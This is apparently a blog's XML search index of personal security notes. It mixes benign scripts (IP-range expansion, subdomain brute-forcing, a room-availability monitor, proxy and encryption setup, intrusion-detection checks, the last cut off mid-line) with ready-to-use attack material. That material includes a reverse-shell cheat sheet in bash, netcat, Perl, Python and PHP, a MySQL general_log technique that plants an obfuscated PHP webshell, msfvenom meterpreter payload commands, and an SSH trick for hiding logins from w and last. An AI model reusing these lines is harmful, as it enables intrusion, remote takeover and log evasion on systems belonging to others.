<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SSH login history Hide]]></title>
    <url>%2F2018%2F09%2F07%2Fssh_login_hide%2F</url>
    <content type="text"><![CDATA[w和last命令内不显示登录痕迹 ssh -lroot 127.0.0.1 /usr/bin/bash #登录之后直接调用bash ssh -lroot 127.0.0.1 /usr/bin/ls #登录之后直接调用命令 ssh -T root@127.0.0.1 /usr/bin/bash -i # -T表示不分配伪终端 -i表示是交互式shell 查找登录痕迹 lsof -i:22 | grep EST ps -ef | grep ssh 历史痕迹： /var/log/secure /var/log/auth.log]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[互联网资产搜集思路]]></title>
    <url>%2F2018%2F09%2F04%2F%E4%BA%92%E8%81%94%E7%BD%91%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[给定域名、部分IP： 整理成C段IP， [] [centos_shell]123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/python# -*- coding:utf-8 -*-#exp:192.168.1.1 &gt;&gt;&gt; 192.168.1.0/24import re # def cleanCLRFspace(content):# noCLContext = content.replace('\n','')# noSpaceCLRFcontext = noCLContext.strip()# return noSpaceCLRFcontext def readFile(): ipf = open('./content.txt','r') return ipf def getLineIP(ipf): ipList = set() texts = ipf.readlines() for text in texts: ips = re.findall(r'\d+\.\d+?\.\d+?\.\d+?',text) for ip in ips: ipList.add(ip) return ipList def ip2c(ipNoDup): ipset = set() for ip in ipNoDup: ipset.add(re.findall(r'\d+?\.\d+?\.\d+?\.',ip)[0] + '0/24') iplist = list(ipset) iplist.sort() return iplist def saveContext(s): wfile = open('./result.txt','w') for i in s: wfile.write(i+'\n') wfile.close() if __name__ == '__main__': ipf = readFile() ipList = getLineIP(ipf) iplist = ip2c(ipList) saveContext(iplist) [] [centos_shell]123456789101112131415161718#!/bin/bash#使用方法：./*.sh Cip.txt#备注：192.168.1.0/24 &gt;&gt;&gt; 192.168.1.0-192.168.1.254 范围IPwhile read IPRANGEdo IP_FILE_NAME=$(echo $IPRANGE | cut -d/ -f1) IP_1="$(echo $IPRANGE | cut -d"." -f1-2)." IP_3="$(echo $IPRANGE | cut -d"." -f3)" MAX_IP_3="$(sipcalc $IPRANGE | awk -F. '/Usable range/&#123;print $6&#125;')" for i in $(seq $IP_3 $MAX_IP_3) do for j in $(seq 1 254) do echo "$&#123;IP_1&#125;$&#123;i&#125;.$&#123;j&#125;" &gt;&gt;results.txt done donedone &lt; $1 一步到位：[] [centos_shell]123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226#!/bin/bash#Desc:根据起始IP和结束IP输出IP信息#Usage:./iprange.sh IP.txt#notepad++去重： ^(.*?)$\s+?^(?=.*^\1$) 操作方法如下，快捷键Ctrl+H，在弹出的界面输入表达式，并勾选匹配新行。#换行处理否则报错 /r/n /r 全部替换为 /nwhile read line0do #echo $line1 awk -F $line1 "-" '&#123;print $1,$2&#125;' | while read IPA IPB do IPA1=`echo $IPA | awk -F '.' '&#123;print $1&#125;'` IPA2=`echo $IPA | awk -F '.' '&#123;print $2&#125;'` IPA3=`echo $IPA | awk -F '.' '&#123;print $3&#125;'` IPA4=`echo $IPA | awk -F '.' '&#123;print $4&#125;'` IPB1=`echo $IPB | awk -F '.' '&#123;print $1&#125;'` IPB2=`echo $IPB | awk -F '.' '&#123;print $2&#125;'` IPB3=`echo $IPB | awk -F '.' '&#123;print $3&#125;'` IPB4=`echo $IPB | awk -F '.' '&#123;print $4&#125;'` IP4_not_equal()&#123; for i in `eval echo &#123;$IPA4..$IPB4&#125;` do echo $IPA1.$IPA2.$IPA3.$i done &#125; IP3_not_equal () &#123; for i in `eval echo &#123;$IPA3..$IPB3&#125;` do if [[ $i = $IPA3 ]] then eval echo "192.168.$i.&#123;$IPA4..255&#125;" |xargs -n 1 elif [[ $i = $IPB3 ]] then eval echo "192.168.$i.&#123;1..$IPB4&#125;" |xargs -n 1 else eval echo "192.168.$i.&#123;1..255&#125;" | xargs -n 1 fi done &#125; IP2_not_equal()&#123; #第二段的变化范围 for n in `eval echo &#123;$IPA2..$IPB2&#125;` do #如果第二段与IPA的第二段相同 if [ $n = $IPA2 ] then #第三段的变化范围为IPA3到255 for m in `eval echo &#123;$IPA3..255&#125;` do #如果第三段与IPA的第三段相同 if [[ $m = $IPA3 ]] then eval echo "$IPA1.$IPA2.$IPA3.&#123;$IPA4..255&#125;" | xargs -n 1 else eval echo "$IPA1.$IPA2.$m.&#123;1..255&#125;" | xargs -n 1 fi done #如果第三段与IPB的第三段相同 elif [ $n = $IPB2 ] then #第三段变化范围为0到IPB3 for x in `eval echo &#123;0..$IPB3&#125;` do #如果第三段与IPB的第三段相同 if [ $x = $IPB3 ] then eval echo "$IPB1.$IPB2.$IPB3.&#123;0..$IPB4&#125;" |xargs -n 1 else eval echo "$IPB1.$IPB2.$x.&#123;0..255&#125;" |xargs -n 1 fi done #如果第二段与IPA和IPB的均不相同 else #第三段变化范围 for y in &#123;0..255&#125; do echo $IPA1.$n.$y.&#123;0..255&#125; |xargs -n 1 done fi done &#125; #定义pass函数，啥事都不做 pass()&#123; echo ""&gt;/dev/null &#125; IP1_not_equal()&#123; #IP第一段的范围 for d1 in `eval echo &#123;$IPA1..$IPB1&#125;` do #&lt;1&gt;如果第一段与IPA1相同 if [[ $d1 = $IPA1 ]] then #第二段IP范围为IPA2到255 for d2 in `eval echo &#123;$IPA2..255&#125;` do #&lt;1.1&gt;如果第二段与IPA2相同 if [[ $d2 = $IPA2 ]] then #第三段IP范围为IPA3到255 for d3 in `eval echo &#123;$IPA3..255&#125;` do #&lt;1.1.1&gt;如果第三段IP与IPA3相同 if [[ $d3 = $IPA3 ]] then for d4 in `eval echo &#123;$IPA4..255&#125;` do echo $d1.$d2.$d3.$d4 done #&lt;1.1.2&gt;如果第三段IP与IP3不同 else for d4 in &#123;0..255&#125; do echo $d1.$d2.$d3.$d4 done fi done #&lt;1.2&gt;如果第二段与IPA2不同 else for d3 in &#123;0..255&#125; do for d4 in &#123;0..255&#125; do echo $d1.$d2.$d3.$d4 done done fi done #&lt;2&gt;如果第一段IP与IPB相同 elif [[ $d1 = $IPB1 ]] then #第二段IP的范围为0到IPB2 for d2 in `eval echo &#123;0..$IPB2&#125;` do #&lt;2.1&gt;如果第二段IP与IPB相同 if [[ $d2 = $IPB2 ]] then #第三段IP范围为0到IPB3 for d3 in `eval echo &#123;0..$IPB3&#125;` do #&lt;2.1.1&gt;如果第三段IP与IPB3相同 if [[ $d3 = $IPB3 ]] then for d4 in `eval echo &#123;0..$IPB4&#125;` do echo $d1.$d2.$d3.$d4 done #&lt;2.1.2&gt;如果第三段IP与IPB3不同 else for d4 in &#123;0..255&#125; do echo $d1.$d2.$d3.$d4 done fi done #&lt;2.2&gt;如果第二段IP与IPB不相同 else #第三段IP范围为&#123;0..255&#125; for d3 in &#123;0..255&#125; do #第四段IP范围为&#123;0.255&#125; for d4 in &#123;0.255&#125; do echo $d1.$d2.$d3.$d4 done done fi done #&lt;3&gt;第一段IP与IPA1和IPB1都不相同 else for d2 in &#123;0..255&#125; do for d3 in &#123;0..255&#125; do for d4 in &#123;0..255&#125; do echo $d1.$d2.$d3.$d4 done done done fi done &#125; print_range_ip()&#123; #&lt;1&gt;如果两IP第一段不同 if [ $IPA1 != $IPB1 ] then IP1_not_equal #&lt;2&gt;如果两IP第一段相同 else #&lt;2.1&gt; 如果第二段IP相同 if [ $IPA2 = $IPB2 ] then #&lt;2.1.1&gt;如果第三段IP不相同 if [[ $IPA3 != $IPB3 ]] then IP3_not_equal #&lt;2.2.2&gt;如果第三段IP相同 else IP4_not_equal fi #&lt;2.2&gt; 如果第二段IP不相同 else IP2_not_equal fi fi &#125; print_range_ip &gt;&gt; allssip.txt donedone &lt; $1 IP整理完通过工具扫描 爆破子域名通过已给url确定一级域名列表：[] [centos_shell]12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/env python# -*- coding: utf-8 -*-#exp: python *.py url.txt#shell去重命令：awk '!a[$0]++' results.txtimport sysimport shutilimport dns.namefrom tld import get_tldfrom tld.utils import update_tld_names#def getdomain(url):# domain = dns.name.from_text(url).split(3)[1].to_text(omit_final_dot=True)# return(domain)#def getd(url):# update_tld_names()# return(get_tld(url))def getdomain(domain): DomainSuffix = &#123;'info': None, 'coop': None, 'mil': None, 'int': None, 'xxx': None, 'pro': None, 'aero': None, 'idv': None, 'biz': None, 'edu': None, 'org': None, 'net': None, 'gov': None, 'com': None, 'museum': None, 'name': None&#125; Result = [] domain = domain[0:domain.rfind(':')] #去除端口号// url链接不能加http:// if domain.count('.') == 1: return domain PointSplitResult = domain.split('.') if len(filter(lambda x: not x.isdigit(), PointSplitResult)) == 0: return domain if DomainSuffix.has_key(PointSplitResult[-1].lower()): Result = PointSplitResult[-2:] return '.'.join(Result) else: if DomainSuffix.has_key(PointSplitResult[-2].lower()): Result = PointSplitResult[-3:] return '.'.join(Result) else: Result = PointSplitResult[-2:] return '.'.join(Result)if __name__ == '__main__': file = open(sys.argv[1],'r') for line in file.readlines(): line=line.strip('\n')# line = line if '://' in line else 'http://' + line# print line try: print getdomain(line) except Exception as e: print line+"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;" [] [centos_shell]123456789#!/bin/bash#usage:&gt;.sh domain.txtwhile read line1do #echo $line1 python subDomainsBrute.py -i $line1 --full -o $line1done &lt; $1 [] [centos_shell]123456@echo off&amp;setlocal enabledelayedexpansionfor /f "delims=" %%i in (domain.txt) do set "website=%%i"&amp;call :s !website!pause:spython subDomainsBrute.py -i %1 --full -o %1goto :eof]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>bash</tag>
        <tag>linux</tag>
        <tag>sh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[recording]]></title>
    <url>%2F2018%2F08%2F17%2Frecording%2F</url>
    <content type="text"><![CDATA[https://media.defcon.org/ last:https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20presentations/]]></content>
      <categories>
        <category>recording</category>
      </categories>
      <tags>
        <tag>defcon</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ziroom--Monitor]]></title>
    <url>%2F2018%2F08%2F13%2Fziroom%2F</url>
    <content type="text"><![CDATA[[] [centos_shell]12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/usr/bin/env python# -*- coding: utf-8 -*-"""Created on Sat Apr 28 15:52:59 2018@author: root"""import requestsimport itchatimport timeimport datetime#itchat.auto_login()itchat.auto_login(hotReload=True)itchat.auto_login(enableCmdQR=-1)#from urllib import requesturl = "http://phoenix.ziroom.com/v7/room/detail.json?house_id=62947781&amp;city_code=110000&amp;id=61544148"headers = &#123; 'accept': 'application/json;version=3', 'Host': 'phoenix.ziroom.com', 'Referer': 'https://hd.ziroom.com/2018/haiyan/index.html?citycode=110000',# 'token': 'd76a826e-bfb4-4421-902e-132418ebedfa', 'User-Agent': 'okhttp/3.10.0',&#125;def get_page(url): try: response = requests.get(url, headers=headers) if response.status_code == 200: return response.json() except requests.ConnectionError as e: print('Error', e.args)if __name__ == '__main__': n = 0 while (1): n = n+1 json_dict = get_page(url)# print(json_dict) statuss = json_dict['data']['status'] nowTime=datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') print("status:",statuss) if statuss == 'zxpzz': print("NOt Time!!!") itchat.send('&lt;'+str(n)+'&gt;'+'骚年~装修配置中&gt;&gt;&gt;'+nowTime, toUserName='filehelper') time.sleep(360) else: print("GOGOGOOGOOO!!!!!") itchat.send('&lt;'+str(n)+'&gt;'+'0o0o0o0~可以预定了--gogogogo&gt;&gt;&gt;'+nowTime, toUserName='filehelper') time.sleep(120)]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>ziroom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【应急响应】自动化脚本]]></title>
    <url>%2F2018%2F06%2F27%2F%E3%80%90%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E3%80%91%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[Welcome to my blog, enter password to read. Decrypt ]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL's general-log shell]]></title>
    <url>%2F2018%2F06%2F04%2FMySQL's%20general-log%20shell%2F</url>
    <content type="text"><![CDATA[MySQL ROOT: show variables like &apos;%general%&apos;; set global general_log=&apos;on&apos;; SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;; SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;; SELECT &quot;&lt;?php $p = array(&apos;f&apos;=&gt;&apos;a&apos;,&apos;pffff&apos;=&gt;&apos;s&apos;,&apos;e&apos;=&gt;&apos;fffff&apos;,&apos;lfaaaa&apos;=&gt;&apos;r&apos;,&apos;nnnnn&apos;=&gt;&apos;t&apos;);$a = array_keys($p);$_=$p[&apos;pffff&apos;].$p[&apos;pffff&apos;].$a[2];$_= &apos;a&apos;.$_.&apos;rt&apos;;$_(base64_decode($_REQUEST[&apos;cmd&apos;]));?&gt;&quot;; set global general_log = off;]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>shell</tag>
        <tag>log</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Frp结合VPS打造外网Meatsploit]]></title>
    <url>%2F2018%2F04%2F19%2FFrp%EF%BC%8BVPS%E6%89%93%E9%80%A0%E5%A4%96%E7%BD%91Meatsploit%2F</url>
    <content type="text"><![CDATA[前言： 本来一开始是在Vps上直接安装的MSF,想安装的可以试试，附一键脚本： curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall chmod 755 msfinstall &amp;&amp; ./msfinstall 可以用，但是总是时不时崩溃（可能是配置太低），烦的一pi.然后就去Google找到了ngrok的端口转发教程。试了下，可以用，不过用起来反应很慢，时不时还掉线，尼玛啊，最坑的是有的平台（VIP是不可能开的，这辈子都不可能）不能固定外网端口，启动一次客户端就换一个端口，每次都要改Payload，费劲。然后试了下用Frp来转发，相比起来简直不要太爽。 1. 准备工作： VPS一台FRP ##下载地址：https://github.com/fatedier/frp/releases（根据自己的VPS选择对应的版本） ２.安装步骤：在VPS上执行（我的是Centos x64）： wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frp tar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 cd frp_0.16.1_linux_amd64 rm frpc&amp;&amp;rm frpc.ini ##这个是客户端文件，用不上，删不删随意。 ./frps -c frps.ini ##默认配置文件启动服务端。 在自己电脑执行（我的是KALi x64）: wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frp tar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 cd frp_0.16.1_linux_amd64 rm frps&amp;&amp;rm frps.ini ##这个是服务端文件，用不上，删不删随意。 ./frpc -c frpc.ini ##使用配置文件启动客户端。 注意frpc.ini配置文件内容（详细参考）： [common] server_addr = *.*.*.* ##VPS的IP地址 server_port = 7000 [msf] type = tcp ##协议 local_ip = *.*.*.* ##本地内网主机IP。 local_port = 4444 ##本地MSF监听的端口 remote_port = 8011 ##Payload设置的LPORT端口,LHOST为VPS的IP。 Payload生成实例： $ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=VPS的IP lport=8011 -f exe -o payload.exe MSf监听示例： Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/x64/meterpreter_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none) EXTENSIONS no Comma-separate list of extensions to load EXTINIT no Initialization strings for extensions LHOST 172.16.1.254 yes The listen address LPORT 4444 yes The listen port 附一张截图： 结束语：当然frp不止tcp端口转发这一种用法，还可以做socks5,http代理等，其他的自行查看说明文档。]]></content>
      <categories>
        <category>msf</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>frp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How to encrypt files and folders with eCryptfs in Ubuntu/Debian/kali linux]]></title>
    <url>%2F2018%2F03%2F27%2Fencrypt%20in%20linux%2F</url>
    <content type="text"><![CDATA[apt-get install ecryptfs-utils modprobe ecryptfs #Load the ecryptfs kernel driver ecryptfs-setup-private ##default ecryptfs-umount-private # to unmount ecryptfs-mount-private # to mount it again,Switch to another directory except home ####### ecryptfs-setup-private --noautoumount # avoid ecryptfs auto mount at login]]></content>
      <categories>
        <category>encrypt</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>encrypt</tag>
        <tag>eCryptfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Reverse Shell Cheat Sheet]]></title>
    <url>%2F2018%2F03%2F20%2FReverse%20Shell%20Cheat%20Sheet%2F</url>
    <content type="text"><![CDATA[set a listener: nc -nvlp 443 Bash: bash -i &gt;&amp; /dev/tcp/192.168.1.11/443 0&gt;&amp;1 Netcat nc -nv 192.168.1.11 443 -e /bin/bash ##linux nc.exe -nv 192.168.1.11 443 -e cmd ##windows Perl perl -e &apos;use Socket;$i=&quot;192.168.1.11&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S ,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot; /bin/bash -i&quot;);};&apos; Python python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; PHP php -r &apos;$sock=fsockopen(&quot;192.168.1.11&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>bash</tag>
        <tag>perl</tag>
        <tag>netcat</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python PyQt5]]></title>
    <url>%2F2018%2F03%2F07%2FPython%E5%AE%9E%E7%94%A8%2F</url>
    <content type="text"><![CDATA[使用Python3，PyQt5实现简易浏览器from PyQt5.QtWidgets import QApplication from PyQt5.QtWebEngineWidgets import QWebEngineView from PyQt5.QtCore import QUrl app = QApplication([]) view = QWebEngineView() view.load(QUrl(&quot;https://translate.google.cn&quot;)) view.show() app.exec_()]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pyqt5</tag>
        <tag>browser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How to setup a socks5 proxy server using Dante]]></title>
    <url>%2F2018%2F01%2F22%2FHow-to-setup-a-socks5-proxy-server-using-Dante%2F</url>
    <content type="text"><![CDATA[debain可用参考链接： https://nfalcone.net/blog/danted-socks-proxy-server/ &gt; 其他： socks5软件包安装:# apt-get update &amp;&amp; apt-get upgrade # apt-get install dante-server # service danted restart # service danted status # danted -v danted: dante v1.1.19 socks5源码安装：# cd /usr/src # wget http://www.inet.no/dante/files/dante-1.4.2.tar.gz # tar -zxf dante-1.4.2.tar.gz # cd dante-1.4.2/ # apt-get install gcc make #./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --disable-client --without-libwrap --without-bsdauth --without-gssapi --without-krb5 --without-upnp --without-pam # make &amp;&amp; make install # /usr/sbin/sockd -v Dante v1.4.2. Copyright (c) 1997 - 2014 Inferno Nettverk A/S, Norway Configuring Dante-server service script# vim /etc/init.d/sockd 参考链接：https://www.proxyrack.com/how-to-setup-a-socks5-proxy-server-using-dante/ debain可能遇到的问题： perl: warning: Falling back to the standard locale (“C”) root@host:~#locale-gen en_GB.UTF-8 root@host:~#localectl set-locale LANG=en_GB.UTF-8,LC_ALL=en_GB.UTF-8 参考：https://konradpodgorski.com/blog/2014/06/23/fixing-locale-problem-debian/ debain VPs 安装失败：仅作记录]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>socks5</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SS安装脚本]]></title>
    <url>%2F2018%2F01%2F22%2FSS%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[一键安装：wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh chmod +x shadowsocks-all.sh ./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log 多用户配置文件：vim /etc/shadowsocks-go/config.json { &quot;server&quot;:&quot;0.0.0.0&quot;, &quot;port_password&quot;:{ &quot;8989&quot;:&quot;password0&quot;, &quot;9001&quot;:&quot;password1&quot;, &quot;9002&quot;:&quot;password2&quot;, &quot;9003&quot;:&quot;password3&quot;, &quot;9004&quot;:&quot;password4&quot; }, &quot;method&quot;:&quot;aes-256-cfb&quot;, &quot;timeout&quot;:600 } 卸载：./shadowsocks-all.sh uninstall 启动命令： 启动脚本后面的参数含义，从左至右依次为：启动，停止，重启，查看状态。 echo &quot;alias ss=&apos;/etc/init.d/shadowsocks-go&apos;&quot; &gt;&gt; .bashrc Shadowsocks-Python 版： /etc/init.d/shadowsocks-python start | stop | restart | status ShadowsocksR 版： /etc/init.d/shadowsocks-r start | stop | restart | status Shadowsocks-Go 版： /etc/init.d/shadowsocks-go start | stop | restart | status Shadowsocks-libev 版： /etc/init.d/shadowsocks-libev start | stop | restart | status 各版本默认配置文件 Shadowsocks-Python 版： /etc/shadowsocks-python/config.json ShadowsocksR 版： /etc/shadowsocks-r/config.json Shadowsocks-Go 版： /etc/shadowsocks-go/config.json Shadowsocks-libev 版： /etc/shadowsocks-libev/config.json VPS测速脚本：wget -qO- –no-check-certificate https://raw.githubusercontent.com/oooldking/script/master/superbench.sh | bash wget -qO- bench.sh | bash 或者 curl -Lso- bench.sh | bash]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>ss</tag>
        <tag>shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Xss常用测试代码]]></title>
    <url>%2F2018%2F01%2F18%2FXss%E5%B8%B8%E7%94%A8%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[简单测试代码： &lt;img src=&quot;#&quot; onerror=&quot;alert(111)&quot;&gt;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msf常用命令]]></title>
    <url>%2F2018%2F01%2F18%2Fmsf-shell%2F</url>
    <content type="text"><![CDATA[Msf安装： curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall chmod 755 msfinstall &amp;&amp; ./msfinstall Msfshell java/meterpreter/reverse_tcp msfvenom -p java/meterpreter/reverse_tcp LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux实用技巧]]></title>
    <url>%2F2018%2F01%2F18%2Flinux%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[自定义终端命令启动程序 编辑 .bashrc 文件： root@kali:~# vim .bashrc root@kali:~# source .bashrc exm： alias burp=&apos;setsid java -jar /root/softs/burpsuite_pro_v1.6.37.jar &gt;/dev/null 2&gt;&amp;1 &amp;&apos; echo &quot;###&quot; &gt; file ##替换文件 echo &quot;###&quot; &gt;&gt; file ##追加写入文件 echo &quot;alias ss=&apos;ss start&apos;&quot; &gt;&gt; .bashrc 设置ssh免密码登录在.ssh目录下： 本地主机： ssh-keygen -t rsa ##生成id_rsa.pub cat vps_rsa.pub &gt;&gt; authorized_keys ##写入文件 复制authorized_keys到远程主机： scp -P 22 authorized_keys root@176.*.145.*:/root/.ssh 从远程主机下载文件： scp -P 22 root@176.*.145.*:/root/test.txt /root/ 批量操作文件find ./ -name &quot;*.docx&quot; | awk -F &quot;.&quot; &apos;{print $2}&apos; | xargs -i -t mv ./{}.docx ./{}.doc #批量修改后缀名 cp -r &apos;find root/a -iname *.doc&apos; root/b #批量复制某后缀名的文件 配置终端使用HTTP or SOCKS5代理 把代理服务器地址写入shell配置文件.bashrc或者.zshrc 直接在.bashrc或者.zshrc添加下面内容 export http_proxy=&quot;http://localhost:port&quot; export https_proxy=&quot;http://localhost:port&quot; 以使用shadowsocks代理为例，ss的代理端口为1080,那么应该设置为 export http_proxy=&quot;socks5://127.0.0.1:1080&quot; export https_proxy=&quot;socks5://127.0.0.1:1080&quot; 或者直接设置ALL_PROXY export ALL_PROXY=socks5://127.0.0.1:1080 然后ESC后:wq保存文件，接着在终端中执行 source ~/.bashrc 或者退出当前终端再起一个终端。 这个办法的好处是把代理服务器永久保存了，下次就可以直接用了。 或者通过设置alias简写来简化操作，每次要用的时候输入setproxy，不用了就unsetproxy。 alias setproxy=&quot;export ALL_PROXY=socks5://127.0.0.1:1080&quot; alias unsetproxy=&quot;unset ALL_PROXY&quot; alias ip=&quot;curl ip.cn&quot;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>bash</tag>
        <tag>linux</tag>
        <tag>sh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux入侵检测基础]]></title>
    <url>%2F2018%2F01%2F18%2Flinux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[审计命令last 这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。 相关参数： last -10（-n） 查看最近10条记录 last -x reboot 查看重启的记录 last -x shutdown 查看关机的记录 last -d 查看登陆的记录 last –help 命令帮助信息 last -f wtmp 用last命令查看wtmp文件（直接打开无法查看） lastb 这个命令用于查看登录失败的情况，本质就是将/var/log/btmp文件格式化输出。 相关参数： lastb name（root） 查看root用户登陆失败记录 lastb -10（-n） 查看最近10条登陆失败记录 lastb –heplp 命令帮助信息 lastlog 这个命令用于查看用户上一次的登录情况，本质就是将/var/log/lastlog文件格式化输出。 相关参数： lastlog 所有用户上一次登陆记录 lastlog -u username（root） root用户上一次登陆记录 lastlog –help 命令帮助信息 who 这个命令用户查看当前登录系统的情况，本质就是将/var/log/utmp文件格式化输出。主要用来查看当前用户名称，以及登陆的ip地址信息，w命令与who一样，会更详细一些。 history查看历史命令记录，其实就是查看root/.bash_history文件内容，删除这个文件，记录就没了。 相关参数： history 查看所有历史记录 history -10 查看最近10条记录 history | grep “wget” 查看wget相关信息的记录 history –help 命令帮助信息 history显示时间戳： export HISTTIMEFORMAT=&quot;%F %Twhoami&quot; history | more 检查用户 Linux不同的用户，有不同的操作权限，但是所有用户都会在/etc/passwd、/etc/shadow、/etc/group文件中记录。 less /etc/passwd 查看是否有新增用户 grep :0 /etc/passwd 查看是否有特权用户（root权限用户） ls -l /etc/passwd 查看passwd最后修改时间 cawk -F: &#39;$3==0 {print $1}&#39; /etc/passwd 查看是否存在特权用户 awk -F: &#39;length($2)==0 {print $1}&#39; /etc/shadow 查看是否存在空口令用户 注：linux设置空口令：passwd -d username 检查进程 一般被入侵的服务器都会运行一些恶意程序，或是挖矿程序，或者DDOS程序等等，如果程序运行着，那么通过查看进程可以发现一些信息。 普通进程ps -aux 查看进程 top查看进程 lsof -p pid 查看进程所打开的端口及文件 lsof -c 进程名 查看关联文件 ps -aux | grep python | cut -d &apos; &apos; -f 2 | xargs kill 杀死python相关的进程 检查/etc/inetd.conf文件，输入：cat /etc/inetd.conf | grep –v &quot;^#&quot;，输出的信息就是你这台机器所开启的远程服务。 隐藏进程ps -ef | awk &apos;{print}&apos; | sort -n | uniq &gt;1 ls /proc | sort -n |uniq &gt;2 diff 1 2 检查文件 被入侵的网站，通常肯定有文件被改动，那么可以通过比较文件创建时间、完整性、文件路径等方式查看文件是否被改动。 find / -uid 0 -print 查找特权用户文件 find / -size +10000k -print 查找大于10000k的文件 find / -name &quot;…&quot; -prin 查找用户名为…的文件 find / -name core -exec ls -l {} \; 查找core文件，并列出详细信息 md5sum -b filename 查看文件的md5值 rpm -qf /bin/ls 检查文件的完整性（还有其它/bin目录下的文件） whereis 文件名 查看文件路径 ls -al 文件名 查看文件创建时间 du -sh 文件名 查看文件大小 检查网络 检查网络的目的，是查看黑客是否通过篡改网卡类型，进行流量嗅探等操作。 ip link | grep 